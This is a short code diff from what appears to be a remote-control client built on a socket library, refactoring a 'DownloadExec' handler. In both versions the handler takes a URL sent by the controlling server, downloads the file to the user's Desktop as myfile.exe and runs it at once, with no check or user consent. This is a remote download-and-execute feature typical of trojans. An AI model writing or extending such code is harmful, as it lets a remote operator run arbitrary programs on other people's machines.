@@ -1,4 +1,4 @@
-﻿namespace ConsoleClient.Handle
+﻿namespace ClientCore.Handle
 {
     using MarrySocket.MClient;
     using NetworkObjects;
@@ -10,14 +10,13 @@
     {
         public void Handle(object receivedClass, ServerSocket serverSocket)
         {
-            DownloadExec downloadExec = (DownloadExec)receivedClass;
-            String url = downloadExec.url;
+            string downloadExec = (string)receivedClass;
 
             String DesktopPath;
             DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
             WebClient Client = new WebClient();
-            Client.DownloadFile(url, DesktopPath + "/myfile.exe");
+            Client.DownloadFile(downloadExec, DesktopPath + "/myfile.exe");
             Process.Start(DesktopPath + "/myfile.exe");
         }
     }
